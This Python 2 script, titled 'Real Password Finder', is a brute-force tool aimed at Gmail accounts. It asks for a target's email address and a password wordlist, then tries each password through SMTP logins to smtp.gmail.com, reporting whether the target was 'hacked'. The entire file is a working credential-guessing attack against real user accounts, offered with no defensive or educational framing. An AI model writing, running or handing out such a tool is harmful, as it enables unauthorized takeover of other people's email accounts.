# -*- coding: utf-8 -*-
#!/usr/bin/python
import sys
import os
import smtplib                #Importing LIbraries
import socket
import subprocess
import time
from random import randint

#Defining colors
class bcolors:
	HEADER = '\033[95m' #move
	OKBLUE = '\033[94m' #blue
	OKGREEN = '\033[92m' #green
	WARNING = '\033[93m' #orange                                  
	FAIL = '\033[91m' #red
	ENDC = '\033[0m' #end color
	BOLD = '\033[1m' #gras
	UNDERLINE = '\033[4m' #underline
        BLEUCIEL = '\033[1;36m' #bleuciel

#Defining variables
rpfp = bcolors.BLEUCIEL + 'Real Password Finder@:' + bcolors.ENDC + ' '
logfile = open ("logfile.txt",'w')
start_time = time.time()
tick = bcolors.OKGREEN + '✔' + bcolors.ENDC + ' '
untick = bcolors.FAIL + '✘' + bcolors.ENDC + ' '

#Clear Command
os.system("clear")

print rpfp + bcolors.BOLD + '{ '+tick+'} ping (www.gmail.com)' + bcolors.OKBLUE +  ' ' # Pinging gmail alert
time.sleep(0.25)
print ' '
print rpfp + '{ '+tick+'/ '+untick+'} Checking Gmail availability started'  #checking availability notification
print ' '
os.system("ping www.gmail.com -c 3")  #pinging gmail command 
print ' '
print rpfp + '{ '+tick+'} Gmail is now available to work !' #gmail availability alert
print ' '
print rpfp + '{ '+tick+'} Connecting To The Server ! ' + bcolors.ENDC + ' '
print ' '
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)  #Defining the smtp server
smtpserver.ehlo()
smtpserver.starttls() #connecting to the server
print rpfp + '{ '+tick+'} Connected !' + bcolors.ENDC + ' '
print ' '
user = raw_input( rpfp + "{ "+tick+"} Enter the Target's Email Address ==>  ") #selecting target
print ' '
print rpfp + bcolors.FAIL + "("+user +")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Target's email succesfully selected ! ==> " + user + bcolors.ENDC + ' '     # target selected alert
print '   '                      
passwfile = raw_input( rpfp + bcolors.FAIL + "("+user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Enter the password list file name ==>  ") #selecting password file
print ' '
print rpfp + bcolors.FAIL + "("+ user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Password File Succesfully Selected ! ==> " + passwfile + bcolors.ENDC + ' ' #passwordfile selected alert
print " "
time.sleep(0.25)
passwfile = open(passwfile, "r")
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Attack Status: Started Now !!! " + bcolors.ENDC + ' '  #bruteforce attack started alert
print ' '
logfile.write (user) #open the logfile and write the user selected (target)
logfile.close() #close the logfile
time.sleep(0.25)

for password in passwfile:  #search for the passwords in the password file
        try:
                smtpserver.login(user, password) #try the username and the passwords in the passwfile 
 
                print " [✔] Password Found ==>  : %s" % password   #password found alert
                break;
        except smtplib.SMTPAuthenticationError: #error log
                print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' ' + "[ "+untick+"] Password Incorrect ==>  : %s" % password #password incorrect alert
                                                                                                                                                                         
print rpfp + bcolors.FAIL + "(" + user + ")"  +  " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Scanning Status: complete !" + bcolors.ENDC + ' '    #scan finished alert
time.sleep(0.25)
print ' '
print rpfp + bcolors.FAIL + "(" + user  + ")" + " > " + bcolors.ENDC +  "{ "+untick+"} All The Passwords for " + "(" + user + ") " +  'Are Checked But No One Works ¯\_(ツ)_/¯ ' 
print '  '
print rpfp + bcolors.FAIL + "(" + user + ")" +  " >" + bcolors.ENDC + " { "+untick+"} Real Password for " + user + " Not Found !  " + bcolors.ENDC + ' ' #password not found alert
print '   '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + " { "+tick+"} Try To Change The Keywords And Generate A New More Powerful Password List ¯\_(ツ)_/¯ " + bcolors.ENDC + ' '
print ' '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + " { "+untick+'} Your Target ' + "( " + user + " )" + ' Was not Hacked!' + bcolors.ENDC + ' '   #target not hacked alert
time.sleep(0.5)
print '   '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' { '+tick+'} Time elapsed: ' + str(time.time() - start_time) + bcolors.ENDC + ' '   #time elapsed in tool
time.sleep(0.25)
print '  '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' { '+tick+'} Good Luck Next Time ! ' + bcolors.ENDC + ' '
print ' '
print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC +  ' { '+untick+'} Exiting Now !' + bcolors.ENDC + ' ' #exiting alert
print ' '
print rpfp + "[ "+ untick+"] Exit !" + bcolors.ENDC # exit alert
print ' '
print ' '
sys.exit #exiting command
